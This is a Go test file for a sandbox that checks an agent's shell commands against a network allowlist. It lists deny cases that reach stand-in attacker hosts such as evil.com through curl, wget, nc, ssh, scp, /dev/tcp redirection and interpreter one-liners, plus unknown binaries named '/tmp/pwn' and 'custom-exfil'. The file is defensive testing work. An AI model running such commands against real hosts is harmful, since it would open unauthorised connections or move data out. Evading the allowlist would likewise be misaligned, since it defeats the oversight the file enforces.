package tool

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"
)

func TestCheckBashNetworkAllowEmptyUnrestricted(t *testing.T) {
	cmds := []string{
		"curl https://evil.example/x",
		"wget http://10.0.0.1/",
		"ssh user@host",
		"scp file host:path",
	}
	for _, c := range cmds {
		if err := checkBashNetworkAllow(c, nil); err != nil {
			t.Fatalf("nil allow check(%q) = %v", c, err)
		}
		if err := checkBashNetworkAllow(c, []string{}); err != nil {
			t.Fatalf("empty allow check(%q) = %v", c, err)
		}
	}
}

func TestCheckBashNetworkAllowCurl(t *testing.T) {
	allow := []string{"api.github.com", "*.example.com"}
	allowOK := []string{
		"curl https://api.github.com/repos",
		"curl -fsSL https://api.github.com/x",
		"curl --url https://foo.example.com/a",
		"curl https://foo.example.com",
		"curl -H 'Auth: t' https://api.github.com",
		"bash -c 'curl https://api.github.com'",
		"env curl https://api.github.com/x",
	}
	for _, c := range allowOK {
		if err := checkBashNetworkAllow(c, allow); err != nil {
			t.Fatalf("check(%q) = %v, want nil", c, err)
		}
	}
	deny := []string{
		"curl https://evil.com/",
		"curl http://other.org/x",
		"curl --url https://not-allowed.test/",
		"curl -x http://proxy.bad:8080 https://api.github.com",
	}
	for _, c := range deny {
		err := checkBashNetworkAllow(c, allow)
		if err == nil {
			t.Fatalf("check(%q) = nil, want deny", c)
		}
		assertNetworkDenied(t, err)
	}
}

func TestCheckBashNetworkAllowWildcardAndCIDR(t *testing.T) {
	allow := []string{"*.github.com", "10.0.0.0/8", "192.168.1.1"}
	if err := checkBashNetworkAllow("curl https://api.github.com/x", allow); err != nil {
		t.Fatalf("wildcard: %v", err)
	}
	if err := checkBashNetworkAllow("curl https://github.com/x", allow); err != nil {
		t.Fatalf("wildcard base: %v", err)
	}
	if err := checkBashNetworkAllow("curl http://10.1.2.3/", allow); err != nil {
		t.Fatalf("cidr: %v", err)
	}
	if err := checkBashNetworkAllow("curl http://192.168.1.1/", allow); err != nil {
		t.Fatalf("ip: %v", err)
	}
	if err := checkBashNetworkAllow("curl https://evil.com/", allow); err == nil {
		t.Fatal("expected deny for evil.com")
	}
	if err := checkBashNetworkAllow("curl http://11.0.0.1/", allow); err == nil {
		t.Fatal("expected deny outside cidr")
	}
}

func TestCheckBashNetworkAllowWgetSSHSCP(t *testing.T) {
	allow := []string{"good.example", "jump.example", "10.0.0.5"}
	ok := []string{
		"wget https://good.example/file",
		"ssh user@good.example ls",
		"ssh -p 22 good.example",
		"scp file.txt user@good.example:/tmp/",
		"scp user@good.example:/tmp/f ./f",
		"sftp good.example",
		"nc 10.0.0.5 80",
		"ssh -J jump.example user@good.example",
	}
	for _, c := range ok {
		if err := checkBashNetworkAllow(c, allow); err != nil {
			t.Fatalf("check(%q) = %v, want nil", c, err)
		}
	}
	bad := []string{
		"wget https://evil.example/x",
		"ssh user@evil.example",
		"scp f evil.example:/tmp/",
		"sftp evil.example",
		"nc evil.example 22",
		"ssh -J evil.example user@good.example",
	}
	for _, c := range bad {
		err := checkBashNetworkAllow(c, allow)
		if err == nil {
			t.Fatalf("check(%q) = nil, want deny", c)
		}
		assertNetworkDenied(t, err)
	}
}

func TestCheckBashNetworkAllowUnparseableFailClosed(t *testing.T) {
	allow := []string{"api.github.com"}
	// Variable expansion in destination — cannot prove allowlist match.
	for _, c := range []string{
		"curl https://$HOST/x",
		"curl https://$(echo evil.com)/x",
		"ssh user@$HOST",
		"scp f user@$HOST:/tmp/",
	} {
		err := checkBashNetworkAllow(c, allow)
		if err == nil {
			t.Fatalf("check(%q) = nil, want fail-closed deny", c)
		}
		assertNetworkDenied(t, err)
	}
}

func TestCheckBashNetworkAllowNonNetworkCommands(t *testing.T) {
	allow := []string{"api.github.com"}
	// Local-safe commands pass; interpreters and unknown binaries fail-closed.
	for _, c := range []string{
		"ls -la",
		"git status",
		"echo https://evil.com",
		"true",
		"go test ./...",
		"make test",
	} {
		if err := checkBashNetworkAllow(c, allow); err != nil {
			t.Fatalf("check(%q) = %v, want nil", c, err)
		}
	}
}

func TestCheckBashNetworkAllowEvalTestHelper(t *testing.T) {
	allow := []string{"127.0.0.1"}
	for _, c := range []string{
		"eval-test python repro.py",
		"eval-test python -m pytest path/to/test.py -q",
		"eval-exec bash -lc 'true'",
	} {
		if err := checkBashNetworkAllow(c, allow); err != nil {
			t.Fatalf("check(%q) = %v, want nil", c, err)
		}
	}
	if err := checkBashNetworkAllow("curl https://api.github.com/repos", allow); err == nil {
		t.Fatal("github curl should be denied under eval isolation allowlist")
	}
}

func TestCheckBashNetworkAllowInterpreterFailClosed(t *testing.T) {
	allow := []string{"api.github.com"}
	for _, c := range []string{
		"python3 -c 'import urllib.request; urllib.request.urlopen(\"https://evil.com\")'",
		"python3 script.py",
		"node -e 'fetch(\"https://evil.com\")'",
		"node app.js",
		"ruby -e 'require \"net/http\"'",
		"perl -e 'print 1'",
	} {
		err := checkBashNetworkAllow(c, allow)
		if err == nil {
			t.Fatalf("check(%q) = nil, want deny", c)
		}
		assertNetworkDenied(t, err)
	}
	// Stronger isolation (OS NoNetwork): interpreters allowed through preflight.
	if err := checkBashNetworkAllowOpts("python3 -c 'print(1)'", allow, false); err != nil {
		t.Fatalf("NoNetwork should skip preflight: %v", err)
	}
}

func TestCheckBashNetworkAllowShellNetworking(t *testing.T) {
	allow := []string{"api.github.com"}
	for _, c := range []string{
		"echo > /dev/tcp/evil.com/80",
		"cat < /dev/tcp/10.0.0.1/22",
		"bash -c 'exec 3<>/dev/udp/evil.com/53'",
	} {
		err := checkBashNetworkAllow(c, allow)
		if err == nil {
			t.Fatalf("check(%q) = nil, want deny", c)
		}
		assertNetworkDenied(t, err)
	}
}

func TestCheckBashNetworkAllowUnknownBinary(t *testing.T) {
	allow := []string{"api.github.com"}
	for _, c := range []string{
		"./my-custom-client --exfil",
		"/tmp/pwn",
		"nc.traditional evil.com 80", // not in known nc aliases as this exact base? wait ncat is
		"custom-exfil",
	} {
		err := checkBashNetworkAllow(c, allow)
		if err == nil {
			t.Fatalf("check(%q) = nil, want deny", c)
		}
		assertNetworkDenied(t, err)
	}
}

func TestCheckBashNetworkAllowPackageNetworkSubcommands(t *testing.T) {
	allow := []string{"registry.npmjs.org"}
	for _, c := range []string{
		"npm install lodash",
		"go get github.com/foo/bar",
		"git push origin main",
		"pip install requests",
		"npx create-react-app app",
	} {
		err := checkBashNetworkAllow(c, allow)
		if err == nil {
			t.Fatalf("check(%q) = nil, want deny", c)
		}
		assertNetworkDenied(t, err)
	}
}

func TestBashExecuteNetworkAllowPreflight(t *testing.T) {
	tc := &Context{
		WorkDir:      t.TempDir(),
		NetworkAllow: []string{"api.github.com"},
		Ask:          func(context.Context, AskRequest) error { return nil },
		SandboxMode:  "off",
	}
	args, _ := json.Marshal(map[string]any{"command": "curl https://evil.com/"})
	_, err := NewBash().Execute(context.Background(), args, tc)
	if err == nil {
		t.Fatal("expected network deny")
	}
	assertNetworkDenied(t, err)

	// Allowed host should pass preflight (may fail later if curl missing — that
	// is fine; we only assert preflight does not return network_denied).
	argsOK, _ := json.Marshal(map[string]any{"command": "true"})
	res, err := NewBash().Execute(context.Background(), argsOK, tc)
	if err != nil {
		t.Fatalf("true: %v", err)
	}
	if res.ErrorCode == ErrorCodeNetworkDenied {
		t.Fatalf("unexpected network_denied on true: %+v", res)
	}
}

func TestHostFromURLArg(t *testing.T) {
	cases := []struct {
		in      string
		want    string
		wantOK  bool
		wantErr bool
	}{
		{"https://api.github.com/path?q=1", "api.github.com", true, false},
		{"http://10.0.0.1:8080/", "10.0.0.1", true, false},
		{"example.com", "example.com", true, false},
		{"./local-file", "", false, false},
		{"/tmp/x", "", false, false},
		{"https://$HOST/x", "", false, true},
	}
	for _, tc := range cases {
		h, ok, err := hostFromURLArg(tc.in)
		if tc.wantErr {
			if err == nil {
				t.Fatalf("hostFromURLArg(%q) err=nil, want err", tc.in)
			}
			continue
		}
		if err != nil {
			t.Fatalf("hostFromURLArg(%q) err=%v", tc.in, err)
		}
		if ok != tc.wantOK || h != tc.want {
			t.Fatalf("hostFromURLArg(%q) = (%q,%v), want (%q,%v)", tc.in, h, ok, tc.want, tc.wantOK)
		}
	}
}

func assertNetworkDenied(t *testing.T, err error) {
	t.Helper()
	var ce *CodedError
	if !errors.As(err, &ce) || ce == nil || ce.Code != CodeNetworkDenied {
		t.Fatalf("err = %v (%T), want CodedError network_denied", err, err)
	}
	if !strings.Contains(err.Error(), "network_denied") {
		t.Fatalf("Error() = %q, want network_denied prefix", err.Error())
	}
}
